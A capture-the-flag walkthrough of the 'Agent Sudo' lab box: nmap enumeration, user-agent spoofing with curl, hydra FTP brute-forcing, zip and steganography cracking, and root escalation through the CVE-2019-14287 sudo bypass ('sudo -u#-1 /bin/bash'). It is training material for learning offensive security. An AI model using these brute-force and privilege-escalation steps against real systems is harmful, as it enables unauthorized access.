# Agent Sudo 

> Lorenzo De Simone | 16.12.2022

----------------------------------

## Hosts 

```bash
$IP=10.10.31.105
```

## Enumeration

1. How many open ports? 

```bash
$ sudo nmap -sC -sV -oN nmap/initial 10.10.31.105
[sudo] password for lorenzo: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-16 23:51 CET
Nmap scan report for 10.10.31.105
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds

```

2. How you redirect yourself to a secret page? 

```
Use your own codename as user-agent to access the site 
```

3. What is the agent name? 

```bash
$ curl -A "R" -L 10.10.31.105
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>

```

```bash
$ curl -A "C" -L 10.10.31.105
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```
Using curl with -A to spoof the user-agent and -L to follow any redirects 

R is a valid codename but not the one we are searching for. Since there are 25 Employees the codenames probably follow the alphabet

## Hash cracking and brute-force

1. FTP password 

```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.31.105 ftp     
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-17 00:21:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.31.105:21/
[21][ftp] host: 10.10.31.105   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-17 00:22:22

```
Options: 
-l => specifiy Username 
-P => specifiy Worlist 

2. Zip Password 

```
$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
```
$ binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22 
```
Extracting the .zip with binwalk -e cutie.png reveals 8702.zip

Getting the password for the .zip file: 

```
$ zip2john 8702.zip > hashes 
```
```
$ john hashes                                                                                          1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2022-12-17 00:43) 1.176g/s 52287p/s 52287c/s 52287C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Decrypt .zip file with 7z e "filename"

```
$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

3. steg password

```
$ echo  "QXJlYTUx" | base64 -d
Area51 
```

4. Who is the other agent (in full name?)

```
$ steghide info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

```
```
$ steghide extract -sf cute-alien.jpg                                                                130 ⨯
Enter passphrase: 
wrote extracted data to "message.txt".
```

5. SSH Password

Found Name name and Password in message.txt

## Capture the User Flag 

1. What is The User Flag 
> User Flag found in James home directory 

## Privilege escalation

1. CVE Number for the escalation 
> CVE-2019-14287

Explanation: 
https://www.exploit-db.com/exploits/47502

2. Priv esc 
> sudo -u#-1 /bin/bash



